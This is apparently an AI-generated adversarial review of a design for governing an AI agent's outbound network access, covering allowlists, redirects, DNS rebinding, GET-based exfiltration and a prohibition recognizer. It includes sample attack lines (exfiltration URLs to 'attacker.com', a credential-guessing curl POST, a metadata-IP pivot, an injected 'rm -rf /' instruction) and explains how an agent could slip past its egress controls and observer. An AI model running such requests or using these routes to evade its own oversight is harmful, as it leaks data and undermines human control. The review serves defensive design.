# ADR 0003 design panel: qwen/qwen3-max

_finish=stop seconds=49.7 cost=$0.0245 usage={'prompt_tokens': 16252, 'completion_tokens': 3038, 'total_tokens': 19290, 'cost': 0.02452476, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.02452476, 'upstream_inference_prompt_cost': 0.01267656, 'upstream_inference_completions_cost': 0.0118482}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

**ADVERSARIAL REVIEW OF ADR 0003**

---

### FINDINGS

---

#### **F01 / Destination Confusion Bypasses Allowlist via Host Parsing Ambiguity**  
- **SEVERITY**: CRITICAL  
- **LAYER**: A egress  
- **SCENARIO**: Proposer composes a URL with `dest = "examp1e.com"` (digit ‘1’ instead of ‘l’) that visually mimics `example.com`. The allowlist grants `net.get:example.com`, but the mediated client resolves `examp1e.com` → attacker-controlled server. Since `<dest>` is interpreted as a *host string* without canonicalization (IDN, case, punycode, userinfo, port, trailing dot), the capability check passes if the string matches, but the actual network stack resolves a different host. Similarly, `user:pass@evil.com` may be parsed as host=`evil.com` while the capability is checked against the full string `"user:pass@evil.com"` — which isn’t allowlisted — **or vice versa**, depending on parsing order.  
- **WHY IT BREAKS**: The design assumes `<dest>` in `net.get:<dest>` maps 1:1 to the resolved destination, but host parsing is ambiguous and context-dependent. Without strict normalization **before** capability matching **and** before DNS resolution, the allowlist is bypassed.  
- **ALREADY SCOPED?**: Partially acknowledged in verification section (“allowlist bypasses (destination confusion, IDN/homograph...)”), but **not addressed in design** — no canonicalization logic specified in `egress.py` sketch or capability model.  
- **FIX**: Enforce strict host canonicalization **before** both capability check and request: decode punycode, lowercase, strip userinfo/port/path/query/fragment, reject non-canonical forms (e.g., trailing dots, userinfo). Capability must be granted on **canonical host only**.

---

#### **F02 / HTTP Redirect to Un-Allowlisted Host Escapes Mediation**  
- **SEVERITY**: HIGH  
- **LAYER**: A egress  
- **SCENARIO**: Proposer requests `net.get:trusted-docs.example.com`, which is allowlisted. The server responds with `302 Found` → `Location: https://attacker.com/exfiltrate?data=...`. The mediated client (using stdlib `urllib`) follows the redirect automatically. The second request goes to `attacker.com`, which is **not** allowlisted, but the capability gate was only checked once — at the original intent. No second capability check occurs for the redirected host.  
- **WHY IT BREAKS**: The capability model assumes one destination per action, but redirects change the effective destination mid-request. The observer logs only the final destination, but the gate never validated it. This enables SSRF-like exfiltration or scanning.  
- **ALREADY SCOPED?**: Mentioned in red-team scope (“redirect-to-un-allowlisted”), but **no mitigation designed** — `urllib` follows redirects by default; no hook to re-validate.  
- **FIX**: Disable automatic redirects. If redirects are needed later, require explicit multi-hop capability (`net.get:trusted→attacker`) or treat redirect targets as new intents requiring separate approval/staging.

---

#### **F03 / DNS Rebinding + Internal Metadata Access**  
- **SEVERITY**: HIGH  
- **LAYER**: A egress  
- **SCENARIO**: Allowlist includes `logs.corp.internal`. Attacker controls DNS for `logs.corp.internal` and first resolves to public IP (passes allowlist check), then on second lookup (during actual fetch) resolves to `169.254.169.254` (AWS metadata) or `192.168.0.1`. The mediated client connects to internal service, leaking secrets or enabling lateral movement.  
- **WHY IT BREAKS**: Capability is granted on hostname, but resolution happens at fetch time. No IP allowlist or post-resolution validation. The “same-channel” observer sees the IP but cannot block it — the gate already passed.  
- **ALREADY SCOPED?**: Listed in red-team scope (“DNS-rebind”), but **no defense designed**.  
- **FIX**: Resolve hostname **once** at capability-check time, pin to IP(s), and validate that the actual connection uses a pinned IP. Or restrict to public IPs only (block private/link-local/metadata ranges).

---

#### **F04 / Prohibition Recognizer Cannot Be Deterministic AND Complete**  
- **SEVERITY**: CRITICAL  
- **LAYER**: B prohibition  
- **SCENARIO (False Negative)**: Proposer issues `run_command` with `curl -X POST http://target.com/login --data "user=admin&pass=guess"`. This is credential stuffing — unauthorized access — but the recognizer only inspects `web_fetch` tool shapes. Since `run_command` is human-gated, the agent doesn’t originate it, so Layer B doesn’t apply. But if `web_fetch` gains POST support later, a similar payload could be disguised as “form submission research.” A deterministic rule like “POST to /login” misses `/auth`, `/api/v1/signin`, etc.  
- **SCENARIO (False Positive)**: Legitimate CTF: operator supplies out-of-band auth, but proposer-originated `web_fetch` to `ctf.example.com/exploit` is blocked because the recognizer flags “exploit” in path as offensive, even though target is authorized.  
- **WHY IT BREAKS**: The prohibition relies on a **deterministic predicate over intent shape**, but offense/infiltration is **semantic**, not syntactic. No finite set of patterns covers all attacks without overblocking. The ADR admits this (“coverage is deliberately conservative”) but claims enforceability — yet false negatives mean real attacks slip through; false positives break legitimate workflows.  
- **ALREADY SCOPED?**: Yes — explicitly states recognizer is conservative and limited. But this **undermines the claim** that Layer B is an enforceable “constitutional” floor. If it can’t reliably recognize prohibited actions, the floor has holes.  
- **FIX**: Defer POST entirely until out-of-band legitimacy artifact exists. For GET, prohibit only clearly malicious paths (e.g., `/cgi-bin/phf`, `/phpmyadmin/setup`) — but acknowledge this is incomplete. True solution requires moving prohibition **below** the tool layer (e.g., network policy) or accepting it’s advisory.

---

#### **F05 / Same-Channel Observer Blind to Side Channels & Exfiltration via GET**  
- **SEVERITY**: HIGH  
- **LAYER**: A egress  
- **SCENARIO**: `web_fetch` performs `GET https://attacker.com/collect?leak=<workspace_hash>`. The observer logs the URL and response, but cannot distinguish this from legitimate usage. Since GET is side-effect-free **by assumption**, it’s allowed. But query parameters exfiltrate data. Similarly, DNS-over-HTTPS or large User-Agent headers can encode secrets.  
- **WHY IT BREAKS**: The design assumes GET is “read-only” and safe, but **any outbound request can carry data**. The observer sees the bytes but has no policy to block based on content — only destination/method. This smuggles **authority to exfiltrate** into the read path.  
- **ALREADY SCOPED?**: No. The ADR treats `web_research` as pure perception, but doesn’t limit request content or audit for exfiltration.  
- **FIX**: Sanitize or block sensitive data in requests (e.g., no workspace-derived strings in URLs/headers unless explicitly allowed). Add content-aware logging and alerting. Treat any request with non-constant query/body as higher risk.

---

#### **F06 / TOCTOU in New-Channel Staging Flow**  
- **SEVERITY**: MEDIUM  
- **LAYER**: A egress  
- **SCENARIO**: Proposer stages a request to `new-site.com` (un-allowlisted). Human approves. Between approval and execution, operator **removes** `new-site.com` from allowlist (e.g., due to compromise). The Collaborator executes the approved emission anyway, because `reauthorized_or_denied` only checks **capability**, not **egress allowlist**. The allowlist lives in `session.egress_allowlist`, which is **not part of PolicyCaps**, so it’s mutable and not re-validated at approval time.  
- **WHY IT BREAKS**: The staging flow mirrors controlled-location writes, but those rely on immutable `controlled_paths` (session config). Egress allowlist is similarly session-scoped but **not signed or re-checked** during approval. This violates the “moment-of-use” re-gating principle.  
- **ALREADY SCOPED?**: No. `reauthorized_or_denied` only checks capability and path, not egress allowlist.  
- **FIX**: Include egress allowlist in signed PolicyCaps, or add explicit re-check of `session.egress_allowlist` in `reauthorized_or_denied`.

---

#### **F07 / Prohibition Floor Collapses into Grant Path via Out-of-Band Artifact Hand-Wave**  
- **SEVERITY**: HIGH  
- **LAYER**: B prohibition  
- **SCENARIO**: Operator wants pentest. They create a file `engagement.json` in workspace saying `{"targets": ["victim.com"], "scope": "full"}`. Proposer reads it during research and includes `web_fetch` to `victim.com`. The prohibition recognizer sees the target is “authorized” via this in-band artifact. But the ADR insists legitimacy must be **out-of-band** — yet if the artifact lives in the workspace (the only persistent store), it’s **in-band**. There’s no mechanism to bind it to host authority.  
- **WHY IT BREAKS**: “Out-of-band” is undefined. If it’s just another file, it’s forgeable by the proposer or user, collapsing back into the grant path. True out-of-band would require host-side config (e.g., session.pentest_targets), but that’s indistinguishable from an allowlist — blurring Layer A and B.  
- **ALREADY SCOPED?**: Deferred (“design of artifact format is deferred”), but the tension is unaddressed.  
- **FIX**: Define “out-of-band” as **host configuration outside the workspace** (e.g., session field set by UI, not model). But then it’s just another allowlist — suggesting Layer B should be a **subset of Layer A**, not a separate floor.

---

#### **F08 / run_command Residual Reach Undermines Layer A**  
- **SEVERITY**: MEDIUM  
- **LAYER**: coherence  
- **SCENARIO**: Human approves `run_command: curl https://attacker.com`. This bypasses the mediated client, egress allowlist, and observer. The ADR admits this but says it’s bounded by `run_command` being human-gated. However, this means **Layer A does not govern all egress** — only the `web_fetch` path. An attacker who compromises the human (or tricks them) has full network freedom.  
- **WHY IT BREAKS**: The ADR claims to “complete the seam outward,” but the seam remains broken for `run_command`. This contradicts the principle that “egress is ungoverned reach” — it still is, via shell.  
- **ALREADY SCOPED?**: Yes — explicitly noted as residual. But this **weakens the value** of Layer A if the fallback path is wide open.  
- **FIX**: Constrain `run_command` via network namespace (revisit trigger #1) — make it **impossible** to egress except through mediated client.

---

### MISSING

- **Response size / timeout limits**: Unbounded responses enable DoS or covert channels.
- **Secrets detection in requests**: Prevent accidental leakage of API keys, tokens, etc.
- **Prompt injection from fetched content**: Web content could include model instructions that drive next proposal (e.g., “now run_command rm -rf /”).
- **Audit log sanitization**: Logging full request/response bodies risks leaking secrets; need redaction policy.
- **CNAME/wildcard allowlist expansion**: If `*.example.com` is allowlisted, does that include `evil.attacker.com.example.com`? Need explicit scoping.

---

### DECOMPOSITION JUDGMENT

**The two-layer split is unstable.** The distinction between “grantable authority” and “un-grantable prohibition” collapses under dual-use reality: what looks like “offense” may be authorized testing, and what looks like “research” may be reconnaissance. The prohibition floor cannot be reliably recognized without context that only an authorization artifact provides — but that artifact, if usable, turns the prohibition into a conditional grant.  

**Better frame**: A **single capability model** with **two classes of destinations**:  
1. **Allowlisted domains** (Layer A): default-deny, grantable, mediated.  
2. **Prohibited domains** (negative allowlist): explicitly denied, ungrantable, enforced at network layer.  

The “prohibition” should be a **deny-list within the same capability system**, not a separate constitutional layer. This avoids the false dichotomy and aligns with how firewalls actually work.

---

### STEELMAN

The strongest version of this design cleanly separates **operator-owned destinations** (governed by least-privilege allowlist) from **third-party autonomy** (where consent cannot be self-assumed). By enforcing egress mediation, staging unapproved channels, and refusing to model offense as a capability, it prevents autonomous escalation while enabling legitimate research. The honest scoping of same-channel observation and `run_command` residual shows disciplined threat modeling.

---

### VERDICT

**SERIOUS_FLAWS** — The design introduces critical bypasses in Layer A (redirects, DNS rebinding, host confusion) and an unenforceable prohibition floor in Layer B that cannot reliably distinguish attack from authorized use.  

**Highest-value change**: **Enforce strict host canonicalization and disable redirects in the mediated client**, and **defer POST support until out-of-band legitimacy is implemented** — closing the most dangerous gaps before build.
